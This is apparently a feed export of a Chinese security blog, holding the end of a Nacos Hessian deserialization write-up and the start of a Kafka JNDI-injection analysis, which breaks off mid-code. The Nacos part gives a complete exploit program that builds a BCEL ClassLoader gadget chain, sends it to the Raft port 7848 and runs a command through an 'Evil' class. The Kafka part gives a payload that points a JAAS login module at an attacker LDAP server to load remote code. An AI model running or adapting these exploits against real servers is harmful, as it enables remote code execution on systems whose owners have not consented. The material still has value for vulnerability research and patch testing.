HessianSerializer#deserialize() 方法，存在Hessian反序列化漏洞</span><br><span class="hljs-comment">//此处接收类为 MetadataOperation&lt;ServiceMetadata&gt;，若反序列化类不为 InstanceStoreRequest 则报错，导致服务异常</span><br><span class="hljs-comment">//State为State.STATE_ERROR 导致AbstractProcessor#handleRequest() 不继续执行至 execute() 此漏洞无法再次利用</span><br>    MetadataOperation&lt;ServiceMetadata&gt; op = serializer.deserialize(request.getData().toByteArray(), processType);<br>    readLock.lock();<br>    <span class="hljs-keyword">try</span> &#123;<br>    ...<br>        &#125;<br>        <span class="hljs-keyword">return</span> Response.newBuilder().setSuccess(<span class="hljs-literal">true</span>).build();<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        Loggers.RAFT.error(<span class="hljs-string">&quot;onApply &#123;&#125; service metadata operation failed. &quot;</span>, request.getOperation(), e);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">errorMessage</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span> == e.getMessage() ? e.getClass().getName() : e.getMessage();<br>        <span class="hljs-keyword">return</span> Response.newBuilder().setSuccess(<span class="hljs-literal">false</span>).setErrMsg(errorMessage).build();<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        readLock.unlock();<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//    public static final String SERVICE_METADATA = &quot;naming_service_metadata&quot;;</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">group</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> Constants.INSTANCE_METADATA;<br>&#125;<br></code></pre></td></tr></table></figure><p>MetadataOperation 存在属性 metadata  为泛型，可以构造一个 MetadataOperation 对象，并在其 metadata 属性设置恶意对象，此时反序列化后的对象符合预期，不会报错，服务继续运行，可多次攻击。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MetadataOperation</span>&lt;T&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> -<span class="hljs-number">111405695252896706L</span>;<br><br>    <span class="hljs-keyword">private</span> String namespace;<br><br>    <span class="hljs-keyword">private</span> String group;<br><br>    <span class="hljs-keyword">private</span> String serviceName;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * If the metadata is cluster or instance, the tag should be added with the identity of cluster or instance.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> String tag;<br><br>    <span class="hljs-keyword">private</span> T metadata;<br><br>...<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="利用总结"><a href="#利用总结" class="headerlink" title="利用总结"></a>利用总结</h3><ol><li>攻击端口默认为7848</li><li>为Hessian 反序列化链攻击</li><li>存在三个攻击链</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">naming_persistent_service_v2  ----  PersistentClientOperationServiceImpl<br>naming_instance_metadata  ----  InstanceMetadataProcessor  <br>naming_service_metadata  ----   ServiceMetadataProcessor    <br></code></pre></td></tr></table></figure><ol start="4"><li>PersistentClientOperationServiceImpl  要求反序列化类为 InstanceStoreRequest</li><li>InstanceMetadataProcessor 要求反序列化类为 MetadataOperation<InstanceMetadata></li><li>ServiceMetadataProcessor 要求反序列化类为 MetadataOperation<ServiceMetadata></li><li>MetadataOperation 存在泛型属性 metadata，可设置其为恶意对象进行攻击，不影响服务运行，可多次攻击</li></ol><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>此漏洞利用为Hessian 反序列化，可使用多个Hessian 反序列化 Gadget ，以下payload使用 BCEL ClassLoader Gadget。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.nacos.consistency.entity.WriteRequest;<br><span class="hljs-keyword">import</span> com.alibaba.nacos.naming.core.v2.metadata.InstanceMetadata;<br><span class="hljs-keyword">import</span> com.alibaba.nacos.naming.core.v2.metadata.MetadataOperation;<br><span class="hljs-keyword">import</span> com.alibaba.nacos.naming.core.v2.metadata.ServiceMetadata;<br><span class="hljs-keyword">import</span> com.alipay.sofa.jraft.option.CliOptions;<br><span class="hljs-keyword">import</span> com.alipay.sofa.jraft.rpc.RpcClient;<br><span class="hljs-keyword">import</span> com.alipay.sofa.jraft.rpc.impl.MarshallerHelper;<br><span class="hljs-keyword">import</span> com.alipay.sofa.jraft.rpc.impl.cli.CliClientServiceImpl;<br><span class="hljs-keyword">import</span> com.alipay.sofa.jraft.util.Endpoint;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.google.protobuf.ByteString;<br><span class="hljs-keyword">import</span> com.google.protobuf.Message;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.Repository;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;<br><span class="hljs-keyword">import</span> sun.swing.SwingLazyValue;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NacosExplit</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">CliClientServiceImpl</span> <span class="hljs-variable">cliClientService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CliClientServiceImpl</span>();<br>        cliClientService.init(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CliOptions</span>());<br>        setProperties(cliClientService.getRpcClient());<br><br>        MetadataOperation&lt;ServiceMetadata&gt; metadataOperation = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MetadataOperation</span>&lt;ServiceMetadata&gt;();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">metadataField</span> <span class="hljs-operator">=</span> metadataOperation.getClass().getDeclaredField(<span class="hljs-string">&quot;metadata&quot;</span>);<br>        metadataField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//此处BCEL_ClassLoader() 可更换为其他 Gadget</span><br>        metadataField.set(metadataOperation,BCEL_ClassLoader());<br>        WriteRequest.<span class="hljs-type">Builder</span> <span class="hljs-variable">writeRequestBuilder</span> <span class="hljs-operator">=</span> WriteRequest.newBuilder().setGroup(<span class="hljs-string">&quot;naming_service_metadata&quot;</span>).setData(serialize(metadataOperation));<br><br>        <span class="hljs-comment">//二选一均可以攻击</span><br><span class="hljs-comment">//        MetadataOperation&lt;InstanceMetadata&gt; metadataOperation = new MetadataOperation&lt;InstanceMetadata&gt;();</span><br><span class="hljs-comment">//        Field metadataField = metadataOperation.getClass().getDeclaredField(&quot;metadata&quot;);</span><br><span class="hljs-comment">//        metadataField.setAccessible(true);</span><br><span class="hljs-comment">//        metadataField.set(metadataOperation,BCEL_ClassLoader());</span><br><span class="hljs-comment">//        WriteRequest.Builder writeRequestBuilder = WriteRequest.newBuilder().setGroup(&quot;naming_instance_metadata&quot;).setData(serialize(metadataOperation));</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> cliClientService.getRpcClient().invokeSync(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Endpoint</span>(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">7848</span>), writeRequestBuilder.build(), <span class="hljs-number">10000</span>);<br>        System.out.println(o);<br>    &#125;<br><br>    <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setProperties</span><span class="hljs-params">(RpcClient rpcClient)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">parserClasses</span> <span class="hljs-operator">=</span> rpcClient.getClass().getDeclaredField(<span class="hljs-string">&quot;parserClasses&quot;</span>);<br>        parserClasses.setAccessible(<span class="hljs-literal">true</span>);<br>        Map&lt;String, Message&gt; map = (Map&lt;String, Message&gt;) parserClasses.get(rpcClient);<br>        map.put(<span class="hljs-string">&quot;com.alibaba.nacos.consistency.entity.WriteRequest&quot;</span>, WriteRequest.getDefaultInstance());<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">messages</span> <span class="hljs-operator">=</span> MarshallerHelper.class.getDeclaredField(<span class="hljs-string">&quot;messages&quot;</span>);<br>        messages.setAccessible(<span class="hljs-literal">true</span>);<br>        Map&lt;String, Message&gt; messageMap = (Map&lt;String, Message&gt;) messages.get(MarshallerHelper.class);<br>        messageMap.put(<span class="hljs-string">&quot;com.alibaba.nacos.consistency.entity.WriteRequest&quot;</span>, WriteRequest.getDefaultInstance());<br>&#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ByteString <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(bos);<br>        out.getSerializerFactory().setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        out.writeObject(o);<br>        out.close();<br><br>        <span class="hljs-keyword">return</span> ByteString.copyFrom(bos.toByteArray());<br>    &#125;<br><br>    <span class="hljs-comment">//BCEL ClassLoader Gadget</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">BCEL_ClassLoader</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">JavaClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Repository.lookupClass(Evil.class);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;$$BCEL$$&quot;</span> + Utility.encode(clazz.getBytes(), <span class="hljs-literal">true</span>);<br>        <span class="hljs-type">SwingLazyValue</span> <span class="hljs-variable">swingLazyValue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.JavaWrapper&quot;</span>,<span class="hljs-string">&quot;_main&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]<br>                &#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;payload&#125;&#125;);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">u1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">u2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        u1.put(<span class="hljs-string">&quot;aaa&quot;</span>, swingLazyValue);<br>        u2.put(<span class="hljs-string">&quot;aaa&quot;</span>, swingLazyValue);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(u1,u1);<br>        map.put(u2,u2);<br>        <span class="hljs-keyword">return</span> map;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Evil</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">_main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kafka命令执行漏洞一</title>
    <link href="/2023/04/24/Kafka%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%B8%80/"/>
    <url>/2023/04/24/Kafka%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h2 id="一、kafka"><a href="#一、kafka" class="headerlink" title="一、kafka"></a>一、kafka</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Kafka是最初由Linkedin公司开发，是一个分布式、支持分区的（partition）、多副本的（replica），基于zookeeper协调的分布式消息系统，它的最大的特性就是可以实时的处理大量数据以满足各种需求场景：比如基于hadoop的批处理系统、低延迟的实时系统、storm&#x2F;Spark流式处理引擎，web&#x2F;nginx日志、访问日志，消息服务等等，用scala语言编写，Linkedin于2010年贡献给了Apache基金会并成为顶级开源项目。</p><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>Kafka是由Apache软件基金会开发的一个开源流处理平台，由Scala和Java编写。该项目的目标是为处理实时数据提供一个统一、高吞吐、低延迟的平台。其持久化层本质上是一个“按照分布式事务日志架构的大规模发布&#x2F;订阅消息队列”，这使它作为企业级基础设施来处理流式数据非常有价值。</p><p>此漏洞允许服务器连接到攻击者的 LDAP 服务器并反序列化 LDAP 响应，攻击者可以使用它在 Kafka 连接服务器上执行 java 反序列化小工具链。当类路径中有小工具时，攻击者可以造成不可信数据的无限制反序列化（或）RCE 漏洞。</p><p>此漏洞利用的前提是：需要访问 Kafka Connect worker，并能够使用任意 Kafka 客户端 SASL JAAS 配置和基于 SASL 的安全协议在其上创建&#x2F;修改连接器。 自 Apache Kafka 2.3.0 以来，这在 Kafka Connect 集群上是可能的。 通过 Kafka Connect REST API 配置连接器时，经过身份验证的操作员可以将连接器的任何 Kafka 客户端的 <code>sasl.jaas.config</code> 属性设置为“com.sun.security.auth.module.JndiLoginModule”，它可以是通过“producer.override.sasl.jaas.config”,“consumer.override.sasl.jaas.config”或“admin.override.sasl.jaas.config”属性完成。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Apache Kafka 2.3.0 - 3.3.2</p><h2 id="二、漏洞分析"><a href="#二、漏洞分析" class="headerlink" title="二、漏洞分析"></a>二、漏洞分析</h2><h3 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.kafka<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>kafka-clients<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.3.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-comment">//高版本JDK(jdk8_191以上)需设置此才可通过ldap进行JNDI注入,低版本JDK不影响</span><br>    <span class="hljs-comment">//高版本科配合JNDI高版本绕过方式</span><br>    System.setProperty(<span class="hljs-string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>);<br><br>    <span class="hljs-type">Properties</span> <span class="hljs-variable">props</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>    props.put(<span class="hljs-string">&quot;security.protocol&quot;</span>,<span class="hljs-string">&quot;SASL_SSL&quot;</span>);<br>    props.put(<span class="hljs-string">&quot;sasl.jaas.config&quot;</span>,<span class="hljs-string">&quot;com.sun.security.auth.module.JndiLoginModule &quot;</span> +<br>            <span class="hljs-string">&quot;required user.provider.url=\&quot;ldap://192.168.0.104:1389/Basic/Command/calc\&quot; &quot;</span> +<br>            <span class="hljs-string">&quot;useFirstPass=\&quot;true\&quot; serviceName=\&quot;x\&quot; debug=\&quot;true\&quot; &quot;</span> +<br>            <span class="hljs-string">&quot;group.provider.url=\&quot;xxx\&quot;;&quot;</span>);<br>    props.put(<span class="hljs-string">&quot;bootstrap.servers&quot;</span>, <span class="hljs-string">&quot;localhost:9092&quot;</span>);<br>    props.put(<span class="hljs-string">&quot;key.serializer&quot;</span>, <span class="hljs-string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);<br>    props.put(<span class="hljs-string">&quot;value.serializer&quot;</span>, <span class="hljs-string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);<br>    Producer&lt;String, String&gt; producer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">KafkaProducer</span>&lt;&gt;(props);<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>调试跟进方法</p><p><img src="/image/kafkaimage-0.png" alt="img"></p><p>org.apache.kafka.clients.producer.KafkaProducer构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//3、调用至此构造方法3</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">KafkaProducer</span><span class="hljs-params">(Map&lt;String, Object&gt; configs, Serializer&lt;K&gt; keySerializer, Serializer&lt;V&gt; valueSerializer)</span> &#123;<br>    <span class="hljs-built_in">this</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ProducerConfig</span>(ProducerConfig.appendSerializerToConfig(configs, keySerializer, valueSerializer)), keySerializer, valueSerializer, (ProducerMetadata)<span class="hljs-literal">null</span>, (KafkaClient)<span class="hljs-literal">null</span>, (ProducerInterceptors)<span class="hljs-literal">null</span>, Time.SYSTEM);<br>&#125;<br><br><span class="hljs-comment">//1、调用此构造方法1</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">KafkaProducer</span><span class="hljs-params">(Properties properties)</span> &#123;<br>    <span class="hljs-built_in">this</span>((Properties)properties, (Serializer)<span class="hljs-literal">null</span>, (Serializer)<span class="hljs-literal">null</span>);<br>&#125;<br><br><span class="hljs-comment">//2、调用至此构造方法2</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">KafkaProducer</span><span class="hljs-params">(Properties properties, Serializer&lt;K&gt; keySerializer, Serializer&lt;V&gt; valueSerializer)</span> &#123;<br>    <span class="hljs-built_in">this</span>(Utils.propsToMap(properties), keySerializer, valueSerializer);<br>&#125;<br><br><span class="hljs-comment">//4、最终调用至此构造方法4</span><br>KafkaProducer(ProducerConfig config, Serializer&lt;K&gt; keySerializer, Serializer&lt;V&gt; valueSerializer, ProducerMetadata metadata, KafkaClient kafkaClient, ProducerInterceptors&lt;K, V&gt; interceptors, Time time) &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//以下皆为赋值操作</span><br>        <span class="hljs-built_in">this</span>.producerConfig = config;<br>        <span class="hljs-built_in">this</span>.time = time;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">transactionalId</span> <span class="hljs-operator">=</span> config.getString(<span class="hljs-string">&quot;transactional.id&quot;</span>);<br>        <span class="hljs-built_in">this</span>.clientId = config.getString(<span class="hljs-string">&quot;client.id&quot;</span>);<br>        LogContext logContext;<br>        <span class="hljs-keyword">if</span> (transactionalId == <span class="hljs-literal">null</span>) &#123;<br>            logContext = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogContext</span>(String.format(<span class="hljs-string">&quot;[Producer clientId=%s] &quot;</span>, <span class="hljs-built_in">this</span>.clientId));<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            logContext = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogContext</span>(String.format(<span class="hljs-string">&quot;[Producer clientId=%s, transactionalId=%s] &quot;</span>, <span class="hljs-built_in">this</span>.clientId, transactionalId));<br>        &#125;<br>    ......<br><br>        <span class="hljs-built_in">this</span>.errors = <span class="hljs-built_in">this</span>.metrics.sensor(<span class="hljs-string">&quot;errors&quot;</span>);<br>        <span class="hljs-comment">//调用newSender()方法</span><br>        <span class="hljs-built_in">this</span>.sender = <span class="hljs-built_in">this</span>.newSender(logContext, kafkaClient, <span class="hljs-built_in">this</span>.metadata);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">ioThreadName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;kafka-producer-network-thread | &quot;</span> + <span class="hljs-built_in">this</span>.clientId;<br>        <span class="hljs-built_in">this</span>.ioThread = <span class="hljs-keyword">new</span> <span class="hljs-title class_">KafkaThread</span>(ioThreadName, <span class="hljs-built_in">this</span>.sender, <span class="hljs-literal">true</span>);<br>        <span class="hljs-built_in">this</span>.ioThread.start();<br>        config.logUnused();<br>        AppInfoParser.registerAppInfo(<span class="hljs-string">&quot;kafka.producer&quot;</span>, <span class="hljs-built_in">this</span>.clientId, <span class="hljs-built_in">this</span>.metrics, time.milliseconds());<br>        <span class="hljs-built_in">this</span>.log.debug(<span class="hljs-string">&quot;Kafka producer started&quot;</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (Throwable var24) &#123;<br>        <span class="hljs-built_in">this</span>.close(Duration.ofMillis(<span class="hljs-number">0L</span>), <span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">KafkaException</span>(<span class="hljs-string">&quot;Failed to construct kafka producer&quot;</span>, var24);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用构造方法1</p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-1.png" alt="img"></p><p>直至调用至构造方法4</p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-2.png" alt="img"></p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-3.png" alt="img"></p><p>org.apache.kafka.clients.producer.KafkaProducer#newSender()</p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-4.png" alt="img"></p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-5.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">Sender <span class="hljs-title function_">newSender</span><span class="hljs-params">(LogContext logContext, KafkaClient kafkaClient, ProducerMetadata metadata)</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">maxInflightRequests</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.producerConfig.getInt(<span class="hljs-string">&quot;max.in.flight.requests.per.connection&quot;</span>);<br>    <span class="hljs-type">int</span> <span class="hljs-variable">requestTimeoutMs</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.producerConfig.getInt(<span class="hljs-string">&quot;request.timeout.ms&quot;</span>);<br>    <span class="hljs-comment">//调用至ClientUtils#createChannelBuilder()</span><br>    <span class="hljs-type">ChannelBuilder</span> <span class="hljs-variable">channelBuilder</span> <span class="hljs-operator">=</span> ClientUtils.createChannelBuilder(<span class="hljs-built_in">this</span>.producerConfig, <span class="hljs-built_in">this</span>.time, logContext);<br>    <span class="hljs-type">ProducerMetrics</span> <span class="hljs-variable">metricsRegistry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProducerMetrics</span>(<span class="hljs-built_in">this</span>.metrics);<br>    <span class="hljs-type">Sensor</span> <span class="hljs-variable">throttleTimeSensor</span> <span class="hljs-operator">=</span> Sender.throttleTimeSensor(metricsRegistry.senderMetrics);<br>    <span class="hljs-type">KafkaClient</span> 